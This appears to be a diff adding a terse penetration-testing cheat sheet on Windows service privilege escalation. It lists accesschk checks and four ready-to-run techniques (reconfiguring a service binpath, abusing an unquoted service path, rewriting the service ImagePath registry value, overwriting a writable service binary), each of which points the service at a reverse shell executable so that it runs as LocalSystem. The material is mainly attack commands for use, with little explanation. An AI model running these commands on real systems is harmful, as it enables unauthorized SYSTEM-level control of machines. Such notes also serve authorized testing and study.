@@ -1,0 +1,55 @@
+# Get service informatoin(about permission included)
+    sc qc <service_name>
+
+## Service need be runned with SYSTEM rights
+    SERVICE_START_NAME : LocalSystem
+______________________________________________________________________________
+
+
+# Check <username> permisson on <service_name>
+    accesschk.exe /accepteula -uwcqv <username> <service_name>
+
+## User or user group required permission: SERVICE_CHANGE_CONFIG
+
+## Modify the service config and set the BINARY_PATH_NAME
+    sc config daclsvc binpath= "\"C:\reverse_shell.exe\""
+______________________________________________________________________________
+
+
+# Check currend user permisson on <service_foldef_path>
+    accesschk.exe /accepteula -uwdq
+"C:\<service_foldef_path>\<bin_folder_name>\"
+
+## Service bin_folder_name is unquoted and contains spaces.
+
+## Copy reverse shell to bin service folder name (or first part of folder name)
+    copy C:\reverse_shell.exe "C:\<service_folder_path>\<bin_folder_name>.exe"
+______________________________________________________________________________
+
+
+# Check current user permisson on <service_name_registry>
+    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
+
+## Ned rights:
+  RW NT AUTHORITY\INTERACTIVE
+        KEY_ALL_ACCESS
+
+## Change registry bin to reverse shell
+    reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\reverse_shell.exe /f
+______________________________________________________________________________
+
+
+# Check current user permisson on <service_bin>
+    accesschk.exe /accepteula -quvw "C:\<service_path>\<service_bin>.exe"
+
+## Need rights to write to file, for example
+  RW Everyone
+        FILE_ALL_ACCESS
+
+## Replace service bin to reverse shell
+    copy C:\reverse_shell.exe "C:\<service_path>\<service_bin>.exe" /Y
+
+
+
+
+
